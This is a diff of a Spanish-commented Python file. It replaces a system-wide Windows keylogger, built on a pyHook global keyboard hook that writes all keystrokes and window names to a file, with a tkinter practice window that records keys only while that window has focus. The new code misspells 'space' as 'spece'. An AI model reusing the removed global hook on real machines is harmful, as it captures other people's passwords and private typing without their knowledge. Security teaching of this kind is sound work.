@@ -1,22 +1,63 @@
-#Es necesario descargarse las librerias pyHook y pywin32
-import pyHook, pythoncom, sys, logging, time, datetime
-destino= 'C:\\ruta\\keylogger.txt'
+#Es necesario descargarse las siguientes librerias
+import tkinter as tk, logging
+from datetime import datetime
 
-#Se ejecuta cada vez que se pulsa una tecla
-def OnKeyboardEvent(event):
-  #Escribir log en keylogger.txt
-  logging.basicConfig(filename=destino, level= logging.DEBUG, format='%(message)s')
-  print('WindowName:', event.WindowName) #Nombre de la ventana
-  print('Window:', event.Window) #ID de la ventana
-  print('Key:', event.Key) #Tecla pulsada
-  #Se registra la tecla escrita en el nivel DEBUG 
-  logging.log(logging.DEBUG, event.Key)
-  return True
-  
-hooks_manager= pyHook.HookManager() #Administrador de hooks
-hooks_manager.KeyDown= OnKeyboardEvent #Se indica la función a ejecutar cuando se produzca el evento KeyDown
-hooks_manager.HookKeyboard() #Activa el hook del teclado
+#Archivo donde se guardará el registro
+archivo= 'keylogger.txt'
 
-#Mantiene vivo el programa y procesa los mensajes pendientes de Windows
-while True:
-  pythoncom.PumpWaitingMessages()
+#Configuramos logging una sola vez
+logging.basicConfig(
+  filename = archivo,
+  level = logging.DEBUG,
+  format = "%(asctime)s - %(message)s"
+)
+
+#Teclas pulsadas a ignorar
+teclas_ign =["Shift_L",
+    "Shift_R",
+    "Control_L",
+    "Control_R",
+    "Alt_L",
+    "Alt_R"
+]
+
+def marca_tiempo():
+  timestamp = datetime.now().strftime("%d %m %Y %H:%M:%S")
+  with open(archivo, "a", encoding="utf-8") as f:
+    f.write(f"\n\n--- Inicio: {timestamp} ---\n")
+
+def tecla(event):
+  mensaje = f"Tecla pulsada: {event.keysym}"
+  #Mostrar en la terminal
+  print(mensaje)
+  #Guardar en el archivo
+  if event.keysym == "spece":
+    caracter = " "
+  elif event.keysym == "Return":
+    caracter = "\n"
+  elif event.keysym in teclas_ign:
+    return
+  elif len(event.keysym) == 1:
+    caracter = event.keysym
+  else:
+    caracter = f"[{event.keysym}]"
+  #Reescribimos el contenido acumulado
+  with open(archivo, "a", encoding="utf-8") as f:
+    f.write(caracter)
+
+#Se registra el momento en el que se escribe en el documento
+marca_tiempo()
+
+#Creación de la ventana donde probar el keylogger
+ventana = tk.Tk()
+ventana.title("Práctica de keylogger")
+ventana.geometry("400x200")
+#Creación de un mensaje en la ventana donde está el foco del keylogger
+mensaje = tk.Label(
+  ventana,
+  text = "Prueba la herramienta cs39_kl!")
+mensaje.pack(pady=70) #Centrar el texto a la ventana
+
+#Detectar teclas mientras esta ventana tiene el foco
+ventana.bind("<Key>", tecla)
+ventana.mainloop()
